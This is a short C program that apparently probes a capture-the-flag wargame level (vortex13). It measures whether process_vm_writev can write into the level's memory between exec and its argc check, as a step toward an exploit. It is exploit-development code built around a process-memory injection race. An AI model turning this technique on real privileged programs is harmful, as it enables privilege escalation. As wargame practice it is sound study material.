#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/uio.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <sys/wait.h>
/* rw13: measure whether process_vm_writev can land between the L13
   level's exec and its exit at the argc gate.  Spawns the level with
   argv={NULL}, writes 4 bytes to the .bss scratch (0x804c028) in a
   tight loop per spawn, counts the successes.  A success means the
   post-exec window is writable: the argc-slot rewrite becomes
   possible. */
int main(void) {
    int tries = 0, ok = 0, eperm = 0, esrch = 0;
    for (int run = 0; run < 20; run++) {
        pid_t pid = fork();
        if (pid == 0) {
            char *av[2] = { NULL, NULL };
            char *ev[1] = { NULL };
            execv("/vortex/vortex13", av);
            _exit(127);
        }
        tries++;
        char wbuf[4] = { 0x41, 0x41, 0x41, 0x41 };
        struct iovec l = { wbuf, 4 };
        struct iovec r = { (void *)0x0804c028, 4 };
        /* tight write loop while the level lives */
        for (;;) {
            errno = 0;
            ssize_t w = process_vm_writev(pid, &l, 1, &r, 1, 0);
            if (w == 4) { ok++; break; }
            if (errno == EPERM) { eperm++; break; }
            int st;
            pid_t w2 = waitpid(pid, &st, WNOHANG);
            if (w2 == pid) { esrch++; break; }
            if (w2 < 0) break;
        }
        kill(pid, 9);
        waitpid(pid, 0, 0);
    }
    printf("spawns=%d writes-ok=%d eperm=%d exits=%d\n",
           tries, ok, eperm, esrch);
    return 0;
}
